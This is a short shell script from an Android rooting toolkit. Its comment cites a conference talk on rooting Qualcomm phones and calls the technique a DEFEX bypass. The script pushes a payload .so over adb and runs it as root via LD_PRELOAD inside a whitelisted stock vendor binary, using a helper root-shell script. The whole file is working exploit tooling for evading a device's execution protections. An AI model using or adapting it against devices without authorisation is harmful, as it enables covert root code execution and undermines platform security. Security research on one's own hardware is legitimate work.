#!/bin/sh
set -eu
# DEFEX bypass LD_PRELOAD a payload .so into a stock/whitelisted host:
# https://powerofcommunity.net/assets/v0/poc2024/Pan%20Zhenpeng%20&%20Jheng%20Bing%20Jhong,%20GPUAF%20-%20Two%20ways%20of%20rooting%20All%20Qualcomm%20based%20Android%20phones.pdf

usage() {
    cat >&2 <<'EOF'
usage: rootbin.sh [-H host] [-A args] [-n name] [-e K=V]... <payload.so>
  -H  stock host binary (default /vendor/bin/toybox_vendor)
  -A  host args (default "true")
  -n  /tmp payload name
  -e  extra K=V env (repeatable)
EOF
}

dir=$(cd "$(dirname "$0")" && pwd)
ROOTSH="${ROOTSH:-$dir/rootsh.sh}"
host=/vendor/bin/toybox_vendor
host_args=true
name=""
extra_env=""

while getopts "H:A:n:e:h" o; do
    case "$o" in
        H) host="$OPTARG" ;;
        A) host_args="$OPTARG" ;;
        n) name="$OPTARG" ;;
        e) extra_env="$extra_env $OPTARG" ;;
        h) usage; exit 0 ;;
        *) usage; exit 2 ;;
    esac
done
shift $((OPTIND - 1))
[ $# -ge 1 ] || { usage; exit 2; }

so="$1"
[ -f "$so" ] || { echo "[rootbin] payload not found: $so" >&2; exit 1; }
[ -n "$name" ] || name="$(basename "$so")"

echo "[rootbin] push $so -> /tmp/$name"
adb push "$so" "/tmp/$name" >/dev/null
adb shell "chmod 755 /tmp/$name"

cmd="$(printf '%s LD_PRELOAD=/tmp/%s %s %s' "$extra_env" "$name" "$host" "$host_args" | sed 's/^ *//')"
echo "[rootbin] root <= $cmd"
"$ROOTSH" "$cmd 2>&1; echo rootbin_rc=\$?"
